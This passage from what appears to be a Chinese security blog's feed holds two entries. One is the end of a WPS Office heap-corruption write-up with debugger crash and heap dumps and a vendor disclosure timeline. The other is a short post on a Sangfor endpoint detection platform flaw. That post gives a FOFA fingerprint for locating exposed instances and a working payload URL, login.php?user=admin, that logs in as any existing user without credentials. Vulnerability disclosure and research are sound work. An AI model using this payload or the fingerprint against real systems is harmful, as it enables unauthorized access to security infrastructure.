6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325</span><br><span class="line">09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a</span><br><span class="line">0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23</span><br></pre></td></tr></table></figure><p>堆分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap -p -a cc53afbc</span><br><span class="line">    address cc53afbc found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 6731000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                cc36323c:         cc53afa8               58 -         cc53a000             2000</span><br><span class="line">    6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240</span><br><span class="line">    77a9909b ntdll!RtlDebugAllocateHeap+0x00000039</span><br><span class="line">    779ebbad ntdll!RtlpAllocateHeap+0x000000ed</span><br><span class="line">    779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f</span><br><span class="line">    779eae8e ntdll!RtlAllocateHeap+0x0000003e</span><br><span class="line">    6f080269 MSVCR100!malloc+0x0000004b</span><br><span class="line">    6f08233b MSVCR100!operator new+0x0000001f</span><br><span class="line">    6b726c67 QtCore4!QImageData::create+0x000000fa</span><br><span class="line">    6b726b54 QtCore4!QImage::QImage+0x0000004e</span><br><span class="line">    6b7a0e21 QtCore4!png_get_text+0x00000436</span><br><span class="line">    6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de</span><br><span class="line">    6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf</span><br><span class="line">    6b725eb4 QtCore4!QImageReader::read+0x000001e2</span><br><span class="line">    6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e</span><br><span class="line">    6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator&#x3D;+0x00000693</span><br><span class="line">    6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146</span><br><span class="line">    6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5</span><br><span class="line">    6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a</span><br><span class="line">    6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d</span><br><span class="line">    6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083</span><br><span class="line">    6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6</span><br><span class="line">    6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090</span><br><span class="line">    6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c</span><br><span class="line">    6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060</span><br><span class="line">    6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5</span><br><span class="line">    6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1</span><br><span class="line">    6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046</span><br><span class="line">    6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a</span><br><span class="line">    680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1</span><br><span class="line">    6d0e36df kso!AbstractVisual::visualEvent+0x00000051</span><br><span class="line">    6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f</span><br><span class="line">    6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e</span><br><span class="line"></span><br><span class="line">0:000&gt; dt _DPH_BLOCK_INFORMATION cc780e18-0x20</span><br><span class="line">verifier!_DPH_BLOCK_INFORMATION</span><br><span class="line">   +0x000 StartStamp       : 0xc0c0c0c0</span><br><span class="line">   +0x004 Heap             : 0xc0c0c0c0 Void</span><br><span class="line">   +0x008 RequestedSize    : 0xc0c0c0c0</span><br><span class="line">   +0x00c ActualSize       : 0xc0c0c0c0</span><br><span class="line">   +0x010 Internal         : _DPH_BLOCK_INTERNAL_INFORMATION</span><br><span class="line">   +0x018 StackTrace       : 0xc0c0c0c0 Void</span><br><span class="line">   +0x01c EndStamp         : 0xc0c0c0c0</span><br></pre></td></tr></table></figure><p>段中的最后一个堆条目通常是一个空闲块。堆块的状态指示为空闲块。堆块声明前一个块的大小为00108，而当前块的大小为00a30。前一块报告其自身大小为0x20字节，不匹配。位置为05f61000的堆块的使用似乎是该堆块的使用导致以下块的元数据损坏的可能性。堆块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap -a 05f60000 </span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   05f60000 </span><br><span class="line">    Segment at 05f60000 to 0605f000 (00001000 bytes committed)</span><br><span class="line">    Flags:                00000002</span><br><span class="line">    ForceFlags:           00000000</span><br><span class="line">    Granularity:          8 bytes</span><br><span class="line">    Segment Reserve:      00100000</span><br><span class="line">    Segment Commit:       00002000</span><br><span class="line">    DeCommit Block Thres: 00000200</span><br><span class="line">    DeCommit Total Thres: 00002000</span><br><span class="line">    Total Free Size:      00000146</span><br><span class="line">    Max. Allocation Size: fffdefff</span><br><span class="line">    Lock Variable at:     05f60258</span><br><span class="line">    Next TagIndex:        0000</span><br><span class="line">    Maximum TagIndex:     0000</span><br><span class="line">    Tag Entries:          00000000</span><br><span class="line">    PsuedoTag Entries:    00000000</span><br><span class="line">    Virtual Alloc List:   05f6009c</span><br><span class="line">    Uncommitted ranges:   05f6008c</span><br><span class="line">            05f61000: 000fe000  (1040384 bytes)</span><br><span class="line">    FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8  </span><br><span class="line">        05f605b0: 00108 . 00a30 [100] - free</span><br><span class="line"></span><br><span class="line">    Segment00 at 05f60000:</span><br><span class="line">        Flags:           00000000</span><br><span class="line">        Base:            05f60000</span><br><span class="line">        First Entry:     05f604a8</span><br><span class="line">        Last Entry:      0605f000</span><br><span class="line">        Total Pages:     000000ff</span><br><span class="line">        Total UnCommit:  000000fe</span><br><span class="line">        Largest UnCommit:00000000</span><br><span class="line">        UnCommitted Ranges: (1)</span><br><span class="line"></span><br><span class="line">    Heap entries for Segment00 in Heap 05f60000</span><br><span class="line">         address: psize . size  flags   state (requested size)</span><br><span class="line">        05f60000: 00000 . 004a8 [101] - busy (4a7)</span><br><span class="line">        05f604a8: 004a8 . 00108 [101] - busy (107) Internal </span><br><span class="line">        05f605b0: 00108 . 00a30 [100]</span><br><span class="line">        05f60fe0: 00a30 . 00020 [111] - busy (1d)</span><br><span class="line">        05f61000:      000fe000      - uncommitted bytes.</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 05f60fe0</span><br><span class="line">05f60fe0  a9b3c836 03007087 05f6008c 05f6008c</span><br><span class="line">05f60ff0  05f60038 05f60038 05f61000 000fe000</span><br><span class="line">05f61000  ???????? ???????? ???????? ????????</span><br><span class="line">05f61010  ???????? ???????? ???????? ????????</span><br><span class="line">05f61020  ???????? ???????? ???????? ????????</span><br><span class="line">05f61030  ???????? ???????? ???????? ????????</span><br><span class="line">05f61040  ???????? ???????? ???????? ????????</span><br><span class="line">05f61050  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><h2 id="披露时间表"><a href="#披露时间表" class="headerlink" title="披露时间表"></a>披露时间表</h2><p>该漏洞于2020年8月报告。披露时间表：</p><ul><li>2020-08-04-将电子邮件发送到公开提供的WPS的各种邮件列表（销售和支持）。</li><li>2020-08-10-WPS团队回应该报告可以转发给他们。</li><li>2020-08-11-要求进一步的信息，例如咨询和向适当的渠道披露等。</li><li>2020-08-17-根据先前的要求与WPS团队进行跟进。</li><li>2020-08-18-WPS团队做出回应，他们会照顾好它，并转交给开发团队。</li><li>2020-08-18-通过电子邮件提供技术报告和概念验证（未加密）。</li><li>2020-08-25-WPS跟进报告进度。</li><li>2020-08-26-WPS更新说此问题已转发给开发团队。</li><li>2020-08-28-WPS发送了一封电子邮件，指出该问题已在最新的下载版本11.2.0.9403中得到解决。</li><li>2020-08-28-针对提供的PoC测试了新版本，并确认问题已解决。</li><li>2020-08-28-向WPS团队寻求咨询或更改日志更新。</li><li>2020-08-31-WPS团队通知他们不再更新或维护任何安全公告。</li><li>2020-09-03-漏洞写信 要求CVE。</li></ul><p>参考链接：<a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;总览&quot;&gt;&lt;a href=&quot;#总览&quot; class=&quot;headerlink&quot; title=&quot;总览&quot;&gt;&lt;/a&gt;总览&lt;/h2&gt;&lt;p&gt;WPS Office是由Microsoft珠海的中国软件开发商金山软件开发的办公套件，适用于Microsoft Windows，macOS，
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://www.ol4three.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="堆" scheme="http://www.ol4three.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>深信服-SANGFOR终端检测响应平台-任意用户登录</title>
    <link href="http://www.ol4three.com/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    <id>http://www.ol4three.com/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</id>
    <published>2020-09-12T18:03:42.000Z</published>
    <updated>2020-12-01T16:25:27.756Z</updated>
    
    <content type="html"><![CDATA[<p>前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；<br>看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了；</p><p>fofa指纹：<strong>title=”SANGFOR终端检测响应平台”</strong></p><hr><p>漏洞利用：</p><p>只要用户存在就可以登陆</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip&#x2F;ui&#x2F;login.php?user&#x3D;需登录的用户名</span><br></pre></td></tr></table></figure><p>列如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;1.1.1.1:1980&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure><p>查询完毕以后即可登录平台。<br><a href="https://www.hackbug.net/usr/uploads/2020/08/3963593927.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3963593927.png" alt="QQ截图20200820123214.png"></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；&lt;br&gt;看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了；&lt;/p&gt;
&lt;p&gt;fofa指纹：&lt;strong&gt;title=”SANGFOR终端检测响应平台”&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sangfor" scheme="http://www.ol4three.com/tags/sangfor/"/>
    
  </entry>
  
</feed>
